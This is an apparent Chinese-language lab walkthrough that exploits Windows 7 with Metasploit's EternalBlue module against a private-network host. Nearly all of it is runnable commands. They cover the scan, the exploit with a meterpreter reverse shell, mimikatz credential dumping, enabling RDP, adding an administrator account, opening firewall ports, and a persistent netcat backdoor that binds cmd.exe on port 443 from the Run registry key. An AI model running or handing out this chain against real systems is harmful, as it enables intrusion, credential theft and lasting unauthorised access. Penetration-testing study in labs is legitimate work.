## 一、  启动msf之前的准备工作

root@kali:~#service postgresql start

root@kali:~#msfdb init

root@kali:~#msfconsole

## 二、  查看是否存在漏洞

msf >search ms17_010寻找所需模块

msf >use auxiliary/scanner/smb/smb_ms17_010（加载扫描exp）
msf >set RHOSTS 192.168.92.129（设置被扫描IP）
msf >run(进行扫描，观察是否存在该漏洞)

## 三、  漏洞攻击

msf >use exploit/windows/smb/ms17_010_eternalblue (加载攻击模块)
msf > set RHOST 192.168.92.129（被攻击机IP）
msf >set LHOST 192.168.92.132（设置本地IP）
msf >set LPORT 4444(设置连接端口)
msf >set payload windows/x64/meterpreter/reverse_tcp（配置回链方式）

msf >show options(查看配置相关信息)
msf >run（或者exploit,开始攻击）

## 四、  攻击成功！查看系统信息

meterpreter>sysinfo爆出系统信息
meterpreter>screenshot截屏，截屏后的图片存放在/root/中

meterpreter>upload xx.exe C:\yyy\xxx.exe 这条命令可以上传任意文件，后面会用到，上传后门

meterpreter >shell 进入靶机cmd
如果连接到windows的shell显示乱码，使用如下命令

C:\Windows\system32>chcp 65001

## 五、  爆破密码的过程，使用mimikatz

首先查看是否开启3389端口，如果没有则使用以下命令在cmd中开启

C:\Windows\system32>netstat –ano 观察3389端口是否开启

C:\Windows\system32>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f

C:\Windows\system32>exit

meterpreter > load mimikatz
meterpreter > msv <获取的账号信息是hash值>

meterpreter > ssp <获取的账号信息是明文信息>

meterpreter > wdigest <读取内存中存放的账号密码明文信息>
meterpreter > kerberos <和上面类似>

## 六、  连接win7的远程桌面

重新打开一个命令界面

```
root@kali:~# rdesktop 192.168.92.129
```

输入刚才破解的用户名和密码。如果不使用破解的用户名和密码也可以自己创建一个用户名和密码，但必须赋予创建的账号相关权限

## 七、  创建账号的两种方法

1.通过shell进入靶机，在靶机里创建用户账号，然后添加到administrators用户组，使其也具有administrators权限，最后查看是否是管理员权限

```
meterpreter > shell

C:\Windows\system32>net user test1 123456 /add

C:\Windows\system32>net localgroup administrators test1 /add

C:\Windows\system32>net user test1
```

 

2.利用msf的post后渗透攻击模块，直接在meterpreter下创建，这种创建的账号直接就是administrators权限。

```
meterpreter > run post/windows/manage/enable_rdp

meterpreter > run post/windows/manage/enable_rdp USERNAME=test1 PASSWORD=12345
```

![img](https://img2020.cnblogs.com/blog/1533289/202005/1533289-20200519110008106-1754917541.png)

## 八、  上传后门nc

(ps:如果格式不正确，放在记事本里调一下格式或者换行，正常来说是没有换行的)

 

首先开启win7主机默认共享，以便远程执行命令

```
C:\Windows\system32>cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```

开放win7 443端口

```
C:\Windows\system32> netsh firewall add portopening TCP 443 "test" ENABLE
```

上传瑞士军刀nc.exe到windows主机上

```
meterpreter > upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32


```

将nc添加至启动项

```
meterpreter > reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d 'C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe'


```

开放win7 443端口

```
C:\Windows\system32>netsh firewall add portopening TCP 443 ENABLE 
```

重启win7并测试后门

```
C:\Windows\system32>shutdown -r -f -t 0
重新打开一个会话界面测试后门，如果能直接进入靶机的shell，则说明后门上传成功，以后可以直接通过这条命令连接靶机
```

```
root@kali:~# nc -v 192.168.72.128 443


```
